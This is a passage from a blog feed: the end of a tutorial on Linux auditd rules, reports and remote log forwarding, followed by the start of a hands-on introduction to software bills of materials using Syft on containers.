</span></span><span class="line"><span class="cl">/sbin/autrace
</span></span><span class="line"><span class="cl">/usr/bin/aulast
</span></span><span class="line"><span class="cl">/usr/bin/aulastlog
</span></span><span class="line"><span class="cl">/usr/bin/ausyscall
</span></span><span class="line"><span class="cl">/usr/bin/auvirt
</span></span></code></pre></div><p>Let&rsquo;s start with <code>ausearch</code> for now. This program parses the audit log files and gives the information based on passed keywords.</p>
<p>There are a lot of options for this tool.. I&rsquo;ll mention few which I use most often.</p>
<ul>
<li><strong><code>-i</code></strong> &ndash; Interpret the logs. Translates numeric value in names.</li>
<li>If you want to get raw logs, use <strong><code>-r</code></strong>.</li>
<li>use <strong><code>-x</code></strong> to search based on executable name.</li>
<li>If you know the event ID then search with <strong><code>-a</code></strong>.</li>
<li>To search with message type, use <strong><code>-m</code></strong>. You can get the message type list by passing nothing or a wrong message type with the argument/flag.</li>
<li>Use <strong><code>-k</code></strong> to search for specific key in log. You can configure your own key in the logs config. These keys helps to corelate the logs with the rules.</li>
</ul>
<p>If you just want to get a report of everything that was logged, you can use <code>aureport</code> program which gives you a proper summary in a tabular form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   sudo aureport
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Summary Report
</span></span><span class="line"><span class="cl">======================
</span></span><span class="line"><span class="cl">Range of time in logs: 01/01/1970 00:00:00.000 - 12/10/2022 16:24:29.088
</span></span><span class="line"><span class="cl">Selected time for report: 01/01/1970 00:00:00 - 12/10/2022 16:24:29.088
</span></span><span class="line"><span class="cl">Number of changes in configuration: 2
</span></span><span class="line"><span class="cl">Number of changes to accounts, groups, or roles: 0
</span></span><span class="line"><span class="cl">Number of logins: 0
</span></span><span class="line"><span class="cl">Number of failed logins: 0
</span></span><span class="line"><span class="cl">Number of authentications: 0
</span></span><span class="line"><span class="cl">Number of failed authentications: 0
</span></span><span class="line"><span class="cl">Number of users: 3
</span></span><span class="line"><span class="cl">Number of terminals: 4
</span></span><span class="line"><span class="cl">Number of host names: 1
</span></span><span class="line"><span class="cl">Number of executables: 3
</span></span><span class="line"><span class="cl">Number of commands: 1
</span></span><span class="line"><span class="cl">Number of files: 0
</span></span><span class="line"><span class="cl">Number of AVC&#39;s: 0
</span></span><span class="line"><span class="cl">Number of MAC events: 0
</span></span><span class="line"><span class="cl">Number of failed syscalls: 0
</span></span><span class="line"><span class="cl">Number of anomaly events: 0
</span></span><span class="line"><span class="cl">Number of responses to anomaly events: 0
</span></span><span class="line"><span class="cl">Number of crypto events: 0
</span></span><span class="line"><span class="cl">Number of integrity events: 0
</span></span><span class="line"><span class="cl">Number of virt events: 0
</span></span><span class="line"><span class="cl">Number of keys: 0
</span></span><span class="line"><span class="cl">Number of process IDs: 42
</span></span><span class="line"><span class="cl">Number of events: 240
</span></span></code></pre></div><h3 id="writing-custom-audit-rules">Writing custom audit rules</h3>
<p><code>auditd</code> also allows us to write our own rules. These rules will be read and applied when the service is restarted&hellip; or if you invoke <code>augenrules --load</code>.</p>
<p>For auditing, there are only three types of rules that can be defined:</p>
<ol>
<li>
<p>Watches on the file system (watches the changes related to filesystem or on a particular path)</p>
</li>
<li>
<p>syscalls (checks if a specific syscall was executed and with what context)</p>
</li>
<li>
<p>control rules (these are used to modify the kernel configuration of linux audit)</p>
</li>
</ol>
<p>That&rsquo;s all. This was all we needed to know before we started writing our first simple rule.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><p>The above rule will watch for all kinds of changes in <code>/etc/</code> folder&hellip; that means any (r)ead, (w)rite, (e)xecute or (a)ttribute change operations will be logged.</p>
<p>Let&rsquo;s write the above rule in a new file: <code>/etc/audit/rules.d/myrules.rules</code>&hellip; And check if it is picked up by auditd already. (I know it will not be picked, but it won&rsquo;t hurt to check)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">No rules
</span></span></code></pre></div><p>Now, let&rsquo;s restart the service and try that again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># service auditd restart
</span></span><span class="line"><span class="cl"># sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc -p rwxa
</span></span></code></pre></div><p><code>auditd</code> has now loaded the rule, as expected. But there&rsquo;s more to it than just what we put in the file. It makes no difference, however, because it is implicitly adding <code>-p rwxa</code> to indicate that all of these operations should be monitored.</p>
<p>The files still contain what we added&hellip; but the kernel has fully expanded rules.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/rules.d/myrules.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/audit.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## This file is automatically generated from /etc/audit/rules.d
</span></span><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b 8192
</span></span><span class="line"><span class="cl">-f 1
</span></span><span class="line"><span class="cl">-w /etc/
</span></span></code></pre></div><p>With this rule in the kernel, all the operations made to <code>/etc</code> path will be recorded. To make things easy, think of all the <strong>watch</strong> rules as just fancy wrappers for syscall rules. Above rule can be written as below, and will still work the same.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
</span></span></code></pre></div><p>Remove the previous rule and add the above rule to the same file. Restart the service again for the changes to take effect.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo cat /etc/audit/audit.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## This file is automatically generated from /etc/audit/rules.d</span>
</span></span><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b <span class="m">8192</span>
</span></span><span class="line"><span class="cl">-f <span class="m">1</span>
</span></span><span class="line"><span class="cl">-a exit,always  -F <span class="nv">dir</span><span class="o">=</span>/etc -F <span class="nv">perm</span><span class="o">=</span>rwxa
</span></span></code></pre></div><p>Auto-generated event is what we wrote in the file. Let&rsquo;s take a look what it looks like from kernel point of view.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo auditctl -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-w /etc -p rwxa
</span></span></code></pre></div><p>Told you, its practically the same. Now let&rsquo;s understand all the options in the new rule we wrote (obviously for better clarity on how it is same).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
</span></span></code></pre></div><ul>
<li><code>-a</code> : append rule to end of the list</li>
<li><code>exit,always</code> : always log when exiting a syscall.</li>
<li><code>-F</code> : build a rule based on (F)ield values</li>
<li><code>dir=/etc</code>: full path of directory to watch; watches recursively to whole subtrees.</li>
<li><code>perm=rwxa</code>: permission changes/access to monitor.</li>
</ul>
<p>According to <code>man 8 auditctl</code>, <strong>if  a field rule is given and no syscall is specified, it will default to all syscalls.</strong> That means the above rule will work for all of the syscalls.</p>
<p>So far so good. Now what about control rules?? ..Or let&rsquo;s say <em>configure</em> rules as they help in configuring the behaviour of auditd itself.</p>
<p>These rules help in configuring/controling the behaviour of auditd. Read the man page for better and complete explanation. But I&rsquo;ll walk you through the ones we have already seen&hellip;. in the <code>/etc/audit/audit.rules</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-D
</span></span><span class="line"><span class="cl">-b 8192
</span></span><span class="line"><span class="cl">-f 1
</span></span></code></pre></div><ul>
<li>
<p><code>-D</code> deletes all the previous rules from kernel rules list. This should be always on the top If you want to give someone a hard time, just put that in the end.(<strong>please don&rsquo;t do it on production machines, it won&rsquo;t be funny</strong>)</p>
</li>
<li>
<p><code>-b</code> sets the size for audit buffer. If you don&rsquo;t know what you are doing, leave it to the default.</p>
</li>
<li>
<p><code>-f</code> sets the failure mode that let&rsquo;s the kernel decide how to handle failures and critical errors. 0 is silent. Default is 1 (printk). Super secured environment should be using 2 (panic).</p>
</li>
</ul>
<h3 id="pre-packaged-audit-rules">Pre-packaged audit rules</h3>
<p>Most of the times, we don&rsquo;t really need to write our own audit rules, we can just use what other people have already worked upon. You can always find them with the help of your favorite search engine&hellip;but there are few already pre-packaged with <code>audit</code> and are already on your system (if you have installed the package)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">rpm</span> <span class="o">-</span><span class="n">ql</span> <span class="n">audit</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">&#39;/usr/share/.*\.rules$&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">base</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">11</span><span class="o">-</span><span class="n">loginuid</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">cont</span><span class="o">-</span><span class="n">fail</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">error</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">20</span><span class="o">-</span><span class="n">dont</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">21</span><span class="o">-</span><span class="n">no32bit</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">22</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">chrony</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">23</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">filesystems</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">nispom</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">ospp</span><span class="o">-</span><span class="n">v42</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">pci</span><span class="o">-</span><span class="n">dss</span><span class="o">-</span><span class="n">v31</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">stig</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">31</span><span class="o">-</span><span class="n">privileged</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">32</span><span class="o">-</span><span class="n">power</span><span class="o">-</span><span class="n">abuse</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">40</span><span class="o">-</span><span class="n">local</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">41</span><span class="o">-</span><span class="n">containers</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">42</span><span class="o">-</span><span class="n">injection</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">43</span><span class="o">-</span><span class="n">module</span><span class="o">-</span><span class="nb">load</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">70</span><span class="o">-</span><span class="n">einval</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">71</span><span class="o">-</span><span class="n">networking</span><span class="o">.</span><span class="n">rules</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">99</span><span class="o">-</span><span class="n">finalize</span><span class="o">.</span><span class="n">rules</span>
</span></span></code></pre></div><p><em>( <strong>NOTE:</strong> The numbers in the filenames play a very important role. For auditd, the first rule found wins. So if there are 2 contradictory rules, the first one found will be applied and the second one will have no effect.)</em></p>
<p>You can copy these rules, or just the ones you want to monitor, to <code>/etc/audit/rules.d/</code> folder and restart the service to pick up the new rules. Or you can use <code>augenrules --load</code> to load them without restarting the service.</p>
<h3 id="hardening-the-audit">Hardening the audit</h3>
<p>First step to harden the audit will be to ensude auditd&rsquo;s configuration is immutable. This can be done with <code>-e 2</code> control rule. Enabling this will prevent further changes in auditd&rsquo;s configurations. This being said, it is very obvious that this should be the last rule in the list.</p>
<p>Next step would be to store the logs into a centralized secure location. <code>Auditd</code> comes with a dispatcher program (<code>auditspd</code>) that can work with <code>auditsp-remote</code> plugin. This program too comes with it&rsquo;s own configuration file, which can be found at <code>/etc/audisp/audisp-remote.conf</code>.</p>
<p><em>This package was not already installed on my system so I installed it with <code>sudo yum install -y audispd-plugins</code>. Once this is installed, <code>auditsp-remote.conf</code> will be there witing for you to edit.</em></p>
<p>There are a few configuration changes you&rsquo;ll need to make to ensure that logs are sent to the remote server. The overall concept is to collect logs using auditd, then use a plugin to send logs to a central server while also disabling local logging of the same logs. This way, we won&rsquo;t have logs on the local system (saving disk space), and we can aggregate logs from multiple servers for analysis.</p>
<p>Let&rsquo;s start it with one change at a time. First one will be to enable the remote logging plugin. To do that, we can make changes to <code>/etc/audisp/plugins.d/au-remote.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE active status to yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">active=yes
</span></span></code></pre></div><p>Then let our audit dispatcher know about the remote server where we want to dispatch the logs. This change will be made to <code>/etc/audisp/audisp-remote.conf</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Remote server name/IP and the port
</span></span><span class="line"><span class="cl">remote_server = 192.168.56.10
</span></span><span class="line"><span class="cl">port = 60
</span></span></code></pre></div><p><em>As a dirty trick, I&rsquo;ve started netcat on port 60 to listen to the incoming data from the host.</em></p>
<p>Last thing is to disable the local logging for <code>auditd</code>. For that, make changes to <code>/etc/audit/auditd.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## CHANGE write logs to no
</span></span><span class="line"><span class="cl">write_logs = no
</span></span></code></pre></div><p>With this done, you have everything configured and ready to test. Now restart the <strong>auditd</strong> service and you&rsquo;ll start getting logs in netcat screen on remote system.</p>
<h2 id="wrap-up">Wrap-up</h2>
<p>In this article, you learnt about how to do better auditing of your linux environment, with the help of <code>auditd</code>. You also learnt about how to write your own rules or get pre-packaged rules to generate specific audit logs&hellip; and ways to get required reports with the help of <code>ausearch</code> and <code>aureport</code> programs.</p>
<p>This article is not intended to be a complete guide for auditing. It&rsquo;s whole purpose is to get you started with the idea of auditing and using the <code>audit</code> package utilities.</p>
<p>If you want to learn more about it, I suggest you to play around and read <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing">RedHat&rsquo;s documentation on system auditing</a> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>. And if you are stuck, use your favorite search engine or&hellip; RTFM.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/8dYmJ6Buo3lYY/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c">https://elixir.bootlin.com/linux/latest/source/kernel/audit.c</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html">https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>Hands-on Intro to SBOM</title>
      <link>https://ayedaemon.github.io/post/2022/05/hands-on-intro-to-sbom/</link>
      <pubDate>Fri, 27 May 2022 22:56:22 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2022/05/hands-on-intro-to-sbom/</guid>
      <description>The concept of a Bill Of Materials (BOM) is well-established in traditional manufacturing as part of supply chain management. A manufacturer uses a BOM to track the parts it uses to create a product. If defects are later found in a specific part, the BOM makes it easy to locate affected products. In software industry, this concept is fairly new and is used to keep track of all the ingredients of the software.</description>
      <content:encoded><![CDATA[<p>The concept of a Bill Of Materials (BOM) is well-established in traditional manufacturing as part of supply chain management. A manufacturer uses a BOM to track the parts it uses to create a product. If defects are later found in a specific part, the BOM makes it easy to locate affected products. In software industry, this concept is fairly new and is used to keep track of all the ingredients of the software.</p>
<h3 id="what-is-sbom-">What is SBOM ??</h3>
<p>A software bill of materials (SBOM) is a formal record of the components used to develop software and its software supply chain relationships, according to the National Telecommunications and Information Administration (NTIA). An SBOM covers both open source (OSS) and proprietary software, creating transparency into potential vulnerabilities and elements within the software. SBOMs can be used for vulnerability management and product integrity.</p>
<p>An SBOM is useful both to the builder (manufacturer) and the buyer (customer) of a software product. Builders often leverage available open source and third-party software components to create a product; an SBOM allows the builder to make sure those components are up to date and to respond quickly to new vulnerabilities. Buyers can use an SBOM to perform vulnerability or license analysis, both of which can be used to evaluate risk in a product.</p>
<h3 id="why-sbom-">Why SBOM ??</h3>
<p>There could be multiple usages of SBOM, like</p>
<ul>
<li>easy End-Of-Life management for dependencies and product itself.</li>
<li>License obligations and policy compliance.</li>
<li>For developers, it can help to unbloat the software by identifying the BOM and clean up unused things or can use it for quality assurance.</li>
<li>Identify and eliminate vulnerabilities from early stages (more shift left)</li>
</ul>
<p>There are many artifacts that can provide SBOM information and this information can be correlated and used together to provide better security insights. These artifacts could be the source code, executables,  published softwares, or in devops world, <strong>containers</strong>!!</p>
<p>Containers are easy way to package and deliver software; Container is like an encapsulated artifact. Here we can get SBOM for <strong>Application dependencies, Secret code, OS packages, Licenses, File data, Configuration files, Container meta-data, etc</strong>. When it comes to security, it’s important to know every part of the system. SBOM gives you a clear list of components that help in monitoring every part for vulnerabilities.</p>
<h3 id="existing-sbom-formats">Existing SBOM formats</h3>
<p>A new SBOM can be created and published in various formats including HTML, CSV, PDF, Markdown, and plain text. SBOM formats are still in development and new formats might arise in future that can address specific problems in a better way. Currently used formats are -  Software Package Data Exchange (SPDX), Software Identification (SWID) Tags, and Cyclone DX.</p>
<ol>
<li><a href="https://spdx.dev/"><strong>SPDX</strong></a></li>
</ol>
<p>Also known as ISO/IEC 5962:2021, SPDX is spearheaded by The Linux Foundation. It is an open standard for describing SBOM information related to provenance, licensing, and security.</p>
<ol start="2">
<li><a href="https://csrc.nist.gov/projects/Software-Identification-SWID"><strong>SWID Tags</strong></a></li>
</ol>
<p>This format identifies and reports software components under four categories across the development lifecycle:</p>
<ul>
<li>Corpus Tags: Identifies and describes components in a pre-installation stage.</li>
<li>Primary Tags: Identifies and describes components in a post-installation stage.</li>
<li>Patch Tags: Identifies and describes the patch.</li>
<li>Supplement Tags: Allows only the tag creator to modify corpus, primary, and patch tags.</li>
</ul>
<ol start="3">
<li><a href="https://cyclonedx.org/"><strong>Cyclone DX</strong></a></li>
</ol>
<p>Managed by Cyclone DX’s core working group, it is designed for application security contexts. Cyclone DX is considered a lightweight standard with features of both SPDX and SWID. It includes four data fields:</p>
<ul>
<li><strong>BOM Metadata</strong>: Description of the supplier, manufacturer, component, and compilation tools.</li>
<li><strong>Components</strong>: Complete information of a proprietary and open-source components along with licensing requirements.</li>
<li><strong>Services</strong>: A list of external APIs that the software may invoke.</li>
<li><strong>Dependencies</strong>: All forms of relationship within the supply chain.</li>
</ul>
<h3 id="dont-talk-show">Don&rsquo;t talk, show!!</h3>
<p>For the demo, I&rsquo;ve created a basic flask application that says hello and have containerized it into 3 different base images - ubuntu, alpine and distroless.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">CONTAINER ID   IMAGE             COMMAND                  CREATED          STATUS          PORTS     NAMES
</span></span><span class="line"><span class="cl">783618b1c6df   sbom_distroless   <span class="s2">&#34;/usr/bin/python3.9 …&#34;</span>   <span class="m">9</span> seconds ago    Up <span class="m">7</span> seconds              sbom_distroless_demo
</span></span><span class="line"><span class="cl">3ed64aef4767   sbom_alpine       <span class="s2">&#34;python app.py&#34;</span>          <span class="m">16</span> seconds ago   Up <span class="m">14</span> seconds             sbom_alpine_demo
</span></span><span class="line"><span class="cl">fe18c421777a   sbom_ubuntu       <span class="s2">&#34;python3 app.py&#34;</span>         <span class="m">19</span> seconds ago   Up <span class="m">17</span> seconds             sbom_ubuntu_demo
</span></span></code></pre></div><p>We can check the size of the container image using 	<code>docker images</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sbom_distroless             latest       6ef7ccd61f84   38 minutes ago      166MB
</span></span><span class="line"><span class="cl">sbom_alpine                 latest       e7e71b412cf5   About an hour ago   161MB
</span></span><span class="line"><span class="cl">sbom_ubuntu                 latest       9e2166292230   About an hour ago   573MB
</span></span></code></pre></div><p>If you want to get more details about the size of each layer then you can use <code>docker history &lt;image&gt;</code> command. More information about the running container (process) can be obtained using <code>docker inspect &lt;container&gt;</code>.</p>
<p>All these commands are good, but they do not provide any information about the application and its dependencies. Docker has recently announced its experimental feature - <code>docker sbom</code>, that allows us to generate the SBOM of a container image. Today, it does this by scanning the layers of the image using the <a href="https://github.com/anchore/syft"><strong>Syft</strong></a> project but in future it may read the SBOM from the image itself or elsewhere.</p>
<p>Let&rsquo;s generate a SBOM for our containers by directly using the syft project.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">syft sbom_distroless
</span></span><span class="line"><span class="cl"> ✔ Loaded image
</span></span><span class="line"><span class="cl"> ✔ Parsed image
</span></span><span class="line"><span class="cl"> ✔ Cataloged packages      [69 packages]
</span></span><span class="line"><span class="cl">NAME                  VERSION                       TYPE
